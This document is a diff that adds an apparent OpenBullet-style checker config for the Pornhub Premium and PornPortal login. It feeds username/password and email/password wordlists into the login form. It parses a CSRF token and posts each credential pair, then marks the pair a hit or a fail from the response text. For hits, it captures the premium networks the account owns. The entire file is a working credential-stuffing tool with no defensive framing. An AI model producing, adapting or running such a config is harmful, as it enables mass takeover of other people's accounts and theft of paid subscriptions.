@@ -1,0 +1,68 @@
+[SETTINGS]
+{
+  "Name": "PornPortal",
+  "SuggestedBots": 1,
+  "LastModified": "2018-12-12T10:51:50.9172236+01:00",
+  "AdditionalInfo": "",
+  "Author": "Spaceman",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.pornhubpremium.com/premium/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "token\" value=\"" "\" />" Recursive=FALSE -> VAR "TOKEN" "" "" 
+REQUEST POST "https://www.pornhubpremium.com/front/authenticate" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&redirect=&from=pc_premium_login&segment=straight&token=<TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "message\":\"Invalid username\/password!" 
+    KEY "Account disabled. Please try again later" 
+    KEY "premium_redirect_cookie\":\"0" 
+    KEY "" 
+    KEY "" 
+    KEY "" 
+    KEY "" 
+    KEY "" 
+    KEY "" 
+    KEY "" 
+    KEY "" 
+  KEYCHAIN Success OR 
+    KEY "premium_redirect_cookie\":\"1" 
+REQUEST GET "https://www.pornhubpremium.com/postlogin" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "var pornportalConfig = {\"data\":\"" "\",\"sid\":\"\"};" Recursive=FALSE -> VAR "PPTOKEN" "" "&network=undefined&domain=undefined&logout=undefined&location=https%3A%2F%2Fwww.pornhubpremium.com%2Fpostlogin" 
+REQUEST GET "https://ppp.contentdef.com/postlogin?data=<PPTOKEN>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "{\"name\":\"" "\",\"owned" Recursive=TRUE -> CAP "Name" "" "" 
+PARSE "<SOURCE>" LR "owned\":" ",\"shortName" Recursive=TRUE -> CAP "Is Owned" "" "" 
